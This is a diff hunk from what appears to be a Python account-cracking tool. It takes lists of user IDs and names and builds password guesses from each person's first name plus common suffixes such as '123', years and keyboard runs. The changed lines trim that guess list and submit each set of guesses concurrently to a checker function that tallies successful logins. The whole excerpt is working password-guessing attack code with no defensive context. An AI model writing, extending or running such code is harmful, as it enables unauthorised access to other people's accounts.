@@ -76,7 +76,8 @@ def password():
 		for kk in fid:
 			idf,nmf = kk.split('|')[0],kk.split('|')[1].lower()
 			frs = nmf.split(' ')[0]
-			pwv = [nmf,frs+frs,frs+' '+frs,frs+'123',frs+'12345',frs+'123456',frs+'2020',frs+'07500750',frs+'1986',frs+'1221',frs+'123123',frs+'123321',frs+'22446688',frs+'1988',frs+'1212',frs+'1122',frs+'1234567890',frs+'123456789',frs+'12345678',frs+'1234567',frs+'',frs+'aassddff',frs+'qqwweerr',frs+'aassddffgghhjjkkll',frs+'zzxxccvvbbnnmm',frs+'qqwweerrttyy',frs+'zzxxccvvbbnnmm',frs+'qqwweerrtt',frs+'qqwweerrtt',frs+'١٢٣٤٥',frs+'١٢٣٤٥٦٧٨٩',frs+'١٢٣١٢٣',frs+'١٢',frs+'١١٢٢',frs+'١٢٣٣٢١',frs+'1122334455',frs+'1990',frs+'112233445566',frs+'1122334455']
+			pwv = [nmf,frs+frs,frs+' '+frs,frs+'123',frs+'12345',frs+'123456',frs+'2020',frs+'1990',frs+'2003',frs+'2007']
+			kp.submit(checker,idf,pwv)
 
 def checker(idf,pwv):
 	global total,ok,cp
